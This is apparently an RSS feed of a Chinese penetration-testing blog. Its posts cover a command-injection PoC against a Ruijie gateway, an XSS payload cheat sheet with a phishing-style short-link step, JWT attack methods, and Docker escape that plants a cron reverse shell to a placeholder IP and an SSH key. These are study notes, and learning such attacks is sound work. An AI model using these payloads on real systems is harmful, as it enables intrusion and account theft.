<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Seal Blog</title>
    <description>这里是 Seal 的个人博客，与你一起发现更大的世界。</description>
    <link>https://luckseal.github.io/</link>
    <atom:link href="https://luckseal.github.io/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 29 Dec 2020 10:49:49 +0800</pubDate>
    <lastBuildDate>Tue, 29 Dec 2020 10:49:49 +0800</lastBuildDate>
    <generator>Jekyll v4.1.1</generator>
    
      <item>
        <title>锐捷易网关远程命令执行漏洞</title>
        <description>&lt;h3 id=&quot;goby抓包&quot;&gt;goby抓包&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229104331621.png&quot; alt=&quot;image-20201229104331621&quot; /&gt;&lt;/p&gt;

&lt;p&gt;估计是网络原因，请求还未到达goby log平台，客户端就去获取，因此未探测到漏洞。但是我们得到了poc，直接测试。&lt;/p&gt;

&lt;h3 id=&quot;poc&quot;&gt;Poc&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;POST /guest_auth/guestIsUp.php HTTP/1.1
Host: x.x.x.x:xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

mac=1&amp;amp;ip=%60busybox ping -c 2 pingtest.xxx.ceye.io%60
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;测试结果&quot;&gt;测试结果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229102328491.png&quot; alt=&quot;image-20201229102328491&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229102942098.png&quot; alt=&quot;image-20201229102942098&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-29-锐捷易网关远程命令执行/image-20201229103053455.png&quot; alt=&quot;image-20201229103053455&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 29 Dec 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/12/29/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/12/29/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</guid>
        
        <category>web安全</category>
        
        <category>rce</category>
        
        
      </item>
    
      <item>
        <title>XSS</title>
        <description>&lt;h1 id=&quot;基本知识&quot;&gt;基本知识&lt;/h1&gt;

&lt;h2 id=&quot;xss&quot;&gt;xss&lt;/h2&gt;

&lt;p&gt;xss是由于未严格过滤用户输入，导致html网页内容可由用户输入控制，从而实现js语句插入，完成某些操作。&lt;/p&gt;

&lt;h2 id=&quot;xss分类&quot;&gt;XSS分类&lt;/h2&gt;

&lt;p&gt;反射性XSS&lt;/p&gt;

&lt;p&gt;储存性XSS&lt;/p&gt;

&lt;p&gt;DOM型XSS&lt;/p&gt;

&lt;h2 id=&quot;xss输出位置&quot;&gt;XSS输出位置&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;HTML&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;JS&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;属性值&lt;/li&gt;
  &lt;li&gt;注释&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;位置&quot;&gt;位置&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;标签&lt;/th&gt;
      &lt;th&gt;属性&lt;/th&gt;
      &lt;th&gt;例&lt;/th&gt;
      &lt;th&gt;编码&lt;/th&gt;
      &lt;th&gt;交互&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;img&lt;/td&gt;
      &lt;td&gt;onerror&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=x onerror=prompt(1);&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;video&lt;/td&gt;
      &lt;td&gt;onerror&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;video src=x onerror=prompt(1);&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;audio&lt;/td&gt;
      &lt;td&gt;onerror&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;audio src=x onerror=prompt(1);&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;iframe&lt;/td&gt;
      &lt;td&gt;src&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe src=&quot;javascript:alert(1)&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe/src=&quot;data:text&amp;amp;sol;html;&amp;amp;Tab;base64&amp;amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;embed&lt;/td&gt;
      &lt;td&gt;src&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;embed/src=//xx.com/aa&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;form&lt;/td&gt;
      &lt;td&gt;action&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;form action=&quot;Javascript:alert(1)&quot;&amp;gt;&amp;lt;input type=submit&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;form action='data:text&amp;amp;sol;html,&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt/script&amp;amp;gt'&amp;gt;&amp;lt;button&amp;gt;CLICK&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;是&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;form&lt;/td&gt;
      &lt;td&gt;formaction&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;form&amp;gt;&amp;lt;button formaction=javascript&amp;amp;colon;alert(1)&amp;gt;CLICKME&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;是&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;object&lt;/td&gt;
      &lt;td&gt;Data&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;object/data=//xx.com/a&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;svg&lt;/td&gt;
      &lt;td&gt;onload&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;svg/onload=prompt(1);&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;marquee&lt;/td&gt;
      &lt;td&gt;onstart&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;marquee/onstart=confirm(1)&amp;gt;/&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;body&lt;/td&gt;
      &lt;td&gt;onload&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;body onload=prompt(1);&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;select&lt;/td&gt;
      &lt;td&gt;onfocus&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;select autofocus onfocus=alert(1)&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;textarea&lt;/td&gt;
      &lt;td&gt;onfocus&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;textarea autofocus onfocus=alert(1)&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;video&lt;/td&gt;
      &lt;td&gt;onerror&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;video&amp;gt;&amp;lt;source onerror=&quot;javascript:alert(1)&quot;&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;否&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;onmouseover&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;a onmouseover=location='javascript:alert(1)'&amp;gt;click&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;是&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;href&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;a href=&quot;javascript:alert(1)//&quot;&amp;gt;Click&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;是&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;绕过&quot;&gt;绕过&lt;/h1&gt;

&lt;h2 id=&quot;代码执行函数&quot;&gt;代码执行函数&lt;/h2&gt;

&lt;h3 id=&quot;eval&quot;&gt;eval&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(&quot;alert()&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;settimeout&quot;&gt;setTimeout&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setTimeout(&quot;alert()&quot;,0)&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;setinterval&quot;&gt;setInterval&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var i = setInterval(&quot;alert();clearInterval(i);&quot;,0);&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;浏览器特有函数&quot;&gt;浏览器特有函数&lt;/h3&gt;

&lt;p&gt;如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ie&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execScript&lt;/code&gt;等，这里不过多关注。&lt;/p&gt;

&lt;h1 id=&quot;利用方式&quot;&gt;利用方式&lt;/h1&gt;

&lt;h2 id=&quot;xss平台&quot;&gt;xss平台&lt;/h2&gt;

&lt;p&gt;XSS平台是编写用于辅助XSS攻击的平台，可以将攻击语句放到XSS平台，然后在XSS位置包含进去，以及可以用它接收cookie等信息。&lt;/p&gt;

&lt;h3 id=&quot;bluelotus平台&quot;&gt;bluelotus平台&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-下载Dockerfile，执行命令如下：&quot;&gt;docker build -t bluelotus .

docker run -d -p 801:80 bluelotus

默认密码为：bluelotus
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-17-XSS/image-20201217145920072.png&quot; alt=&quot;image-20201217145920072&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;登录xss平台，选择公共模板中的default.js，修改website值为XSS平台站点地址即可，然后复制生成的js地址，在xss漏洞页面引入我们生成的恶意js语句。
以DVWA DOM型XSS为例，此时恶意链接为：
http://192.168.74.131:800/vulnerabilities/xss_d/?default=&amp;lt;script src=&quot;http://192.168.74.131:801/template/default.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-17-XSS/image-20201217150114653.png&quot; alt=&quot;image-20201217150114653&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;为了更好的隐蔽，可以将当前恶意链接生成为短地址。&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-12-17-XSS/image-20201217150145677.png&quot; alt=&quot;image-20201217150145677&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;将恶意短地址链接发送给被攻击者，引诱其点击。（生成时有些网站会将XSS语句过滤）&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;黑盒检测&quot;&gt;黑盒检测&lt;/h1&gt;

&lt;h1 id=&quot;流量检测&quot;&gt;流量检测&lt;/h1&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://www.xwood.net/_site_domain_/_root/5870/5874/t_c268566.html&quot;&gt;常见几种跨站脚本漏洞安全测试&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 17 Dec 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/12/17/XSS/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/12/17/XSS/</guid>
        
        <category>xss</category>
        
        <category>web安全</category>
        
        
      </item>
    
      <item>
        <title>JWT相关安全问题</title>
        <description>&lt;h1 id=&quot;什么是jwt&quot;&gt;什么是JWT&lt;/h1&gt;

&lt;p&gt;Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（&lt;a href=&quot;https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519&quot;&gt;(RFC 7519&lt;/a&gt;).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。&lt;/p&gt;

&lt;h1 id=&quot;jwt样式&quot;&gt;JWT样式&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-10-15-JWT相关安全问题/image-20201015102042636.png&quot; alt=&quot;image-20201015102042636&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;漏洞&quot;&gt;漏洞&lt;/h1&gt;

&lt;h2 id=&quot;none算法&quot;&gt;none算法&lt;/h2&gt;

&lt;p&gt;将加密算法设置为none，使用&lt;a href=&quot;https://github.com/jpadilla/pyjwt&quot;&gt;pyjwt&lt;/a&gt;库生成。生成的签名只有前面两部分，提交查看是否可以校验成功。&lt;/p&gt;

&lt;p&gt;注意：某些jwt对大小写敏感，可以尝试none、NONE、None等。&lt;/p&gt;

&lt;h2 id=&quot;未校验签名&quot;&gt;未校验签名&lt;/h2&gt;

&lt;p&gt;修改密钥或直接删除签名，提交jwt内容，查看是否校验通过。如果通过，则说明后台未进行签名校验。&lt;/p&gt;

&lt;h2 id=&quot;弱密钥爆破&quot;&gt;弱密钥爆破&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/lmammino/jwt-cracker&quot;&gt;jwt穷举爆破工具&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/hashcat/hashcat&quot;&gt;hashcat&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;利用签名方法&quot;&gt;利用签名方法&lt;/h2&gt;

&lt;p&gt;如果jwt使用非对称加密方式进行验证，如RSA，我们可以获取到公钥，然后强制设置加密算法为HMAC-SHA，使用RSA公钥进行加密，服务器可能会认为该公钥实际是HMAC密钥。这可用于为在攻击者想要的任何数据。&lt;/p&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/219056.html&quot;&gt;jwt介绍及其安全性分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/211842.html&quot;&gt;全程带阻：记一次授权网络攻防演练&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 15 Oct 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/10/15/JWT%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/10/15/JWT%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</guid>
        
        <category>jwt</category>
        
        
      </item>
    
      <item>
        <title>虚拟化安全</title>
        <description>&lt;h1 id=&quot;探测&quot;&gt;探测&lt;/h1&gt;

&lt;p&gt;适用于容器的技术：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;systemd-detect-virt&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;一云环境元数据接口&quot;&gt;一、云环境元数据接口&lt;/h2&gt;

&lt;p&gt;云环境存在实例metadata api，用以在实例内查询实例相关信息。可以利用metadata api 识别云环境类别。&lt;/p&gt;

&lt;h3 id=&quot;腾讯云&quot;&gt;腾讯云&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://cloud.tencent.com/document/product/213/4934?from=10680&quot;&gt;相关文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;api地址:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://metadata.tencentyun.com/latest/meta-data/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-10-14-虚拟化安全/image-20201215151637788.png&quot; alt=&quot;image-20201215151637788&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;阿里云&quot;&gt;阿里云&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://help.aliyun.com/document_detail/108460.html&quot;&gt;相关文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;api地址: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://100.100.100.200/latest/meta-data/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-10-14-虚拟化安全/image-20201215152213126.png&quot; alt=&quot;image-20201215152213126&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;microsoft-azure&quot;&gt;Microsoft Azure&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service&quot;&gt;相关文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;api地址: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://169.254.169.254/metadata/instance&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;二docker逃逸&quot;&gt;二、docker逃逸&lt;/h2&gt;

&lt;h3 id=&quot;启动参数&quot;&gt;启动参数&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--privileged&lt;/code&gt;利用&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;查看磁盘文件: fdisk -l
新建目录: mkdir /master
宿主机目录挂载至容器: mount /dev/sda1 /master
使用计划任务反弹shell: echo '*****bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/7777 0&amp;gt;&amp;amp;1'&amp;gt;&amp;gt; /master/var/spool/cron/root
或写入ssh密钥文件：(echo -e &quot;\n\n&quot;;cat id_rsa_new.pub) &amp;gt;&amp;gt; /master/root/.ssh/authorized_keys
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--cap-add=SYS_ADMIN&lt;/code&gt;利用&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;在容器内root权限
容器必须使用SYS_ADMIN Linux capability运行
容器必须缺少AppArmor配置文件，否则将允许mount syscall
cgroup v1虚拟文件系统必须以读写方式安装在容器内部
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其他参数：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;--net=host 启动时,绕过Network Namespace
--pid=host 启动时,绕过PID Namespace
--ipc=host 启动时,绕过IPC Namespace
--volume /:/host 挂载主机目录到container
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;dockersock暴露&quot;&gt;docker.sock暴露&lt;/h3&gt;

&lt;h3 id=&quot;cve-2020-15257&quot;&gt;CVE-2020-15257&lt;/h3&gt;

&lt;p&gt;需要设置：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--net=host&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2019-5736&quot;&gt;cve-2019-5736&lt;/h3&gt;

&lt;h3 id=&quot;cve-2019-14271&quot;&gt;CVE-2019-14271&lt;/h3&gt;

&lt;h3 id=&quot;cve-2019-13139&quot;&gt;CVE-2019-13139&lt;/h3&gt;

&lt;h3 id=&quot;dirty-cow&quot;&gt;Dirty cow&lt;/h3&gt;

&lt;h2 id=&quot;十一检测虚拟化环境类型&quot;&gt;十一、检测虚拟化环境类型&lt;/h2&gt;

&lt;h3 id=&quot;systemd-detect-virt&quot;&gt;systemd-detect-virt&lt;/h3&gt;

&lt;p&gt;对于使用 systemd 的 Linux 系统，可以使用 systemd-detect-virt 命令来进行检测，该命令目前可以同时检测到基于 hypervisor 的虚拟化技术（例如 KVM、QEMU、VMware、Xen、Oracle VM、VirtualBox、UML）和基于容器的虚拟化技术（例如 LXC、Docker、OpenVZ）。&lt;/p&gt;

&lt;h4 id=&quot;云环境&quot;&gt;云环境&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-10-14-虚拟化安全/image-20201014110730787.png&quot; alt=&quot;image-20201014110730787&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;物理服务器&quot;&gt;物理服务器&lt;/h4&gt;

&lt;p&gt;输出none&lt;/p&gt;

&lt;h3 id=&quot;virt-what&quot;&gt;virt-what&lt;/h3&gt;

&lt;p&gt;Linux 所使用虚拟化类型的方法是 virt-what 命令，virt-what 实际上是一个 Shell 脚本。它通过各种启发式方法来识别虚拟化环境类型，可以检测出 QEMU/KVM、VMware、Hyper-V、VirtualBox、OpenVZ/Virtuozzo、Xen、LXC、IBM PowerVM 以及 Parallels 等平台类型。&lt;/p&gt;

&lt;p&gt;在使用之前，大家需要先通过 apt-get 或 yum 安装 virt-what。&lt;/p&gt;

&lt;h3 id=&quot;sudo-dmidecode--s-system-manufacturer&quot;&gt;sudo dmidecode -s system-manufacturer&lt;/h3&gt;

&lt;p&gt;检测 Linux 底层的虚拟化类型首选的就是 dmidecode 命令，它最初设计来显示系统 BIOS 和硬件组件的相关信息。使用如下命令便可以检测相关虚拟化信息，如果你的系统运行在物理服务器上，输入的将是硬件制造商的实际名称（如 Dell Inc.）。如果你的 Linux  是运行在虚拟化平台中，则会显示所使用的虚拟化技术相关名称，如 「Microsoft  Corporation」「QEMU」「Xen」「VirtualBox」「VMware, Inc」等等。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;该方法不适用于基于容器的虚拟化技术&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;sudo-readlink-proc1exe&quot;&gt;sudo readlink /proc/1/exe&lt;/h3&gt;

&lt;h3 id=&quot;ls-dockerenv&quot;&gt;ls /.dockerenv&lt;/h3&gt;

&lt;h3 id=&quot;grep-docker-proc1cgroup&quot;&gt;grep ‘/docker’ /proc/1/cgroup&lt;/h3&gt;

&lt;h3 id=&quot;ps--p1&quot;&gt;ps -p1&lt;/h3&gt;

&lt;h3 id=&quot;ps-aux&quot;&gt;ps aux&lt;/h3&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

